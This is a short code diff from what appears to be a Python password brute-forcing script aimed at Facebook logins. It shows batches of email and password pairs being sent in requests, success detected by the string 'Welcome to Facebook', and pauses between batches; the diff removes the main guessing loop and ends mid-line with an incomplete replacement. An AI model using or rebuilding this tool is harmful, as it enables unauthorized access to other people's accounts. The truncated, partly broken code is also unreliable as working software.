@@ -65,9 +65,9 @@ def template(entries):
 
 def attack(entries):
     if len(entries) < 1:
-        return
+        return None
     t = template(entries)
-    return send_request(url, t)
+    return send_request(url, t) or ""
 
 def find_one(entries):
     for entry in entries:
@@ -90,20 +90,5 @@ if __name__ == '__main__':
 
     entries = []
     for email in emails:
-        print(f"Enter email address (as username): {email}")
-        facebook_id = input("Enter Facebook ID:")
-        password_file = input("Enter the password file name:")
-        print("")
-
-        for num in range(0, len(passwds)):
-            if len(entries) == PASSWD_PER_REQUEST:
-                if "Welcome to Facebook" in attack(entries):
-                    find_one(entries)
-                entries = []
-                time.sleep(WAIT_TIME)
-
-            entries.append({"email": email, "passwd": passwds[num]})
-        
-        if "Welcome to Facebook" in attack(entries):
-            find_one(entries)
-        entries = []
+        print("email: %s" % email)
+        for num in range
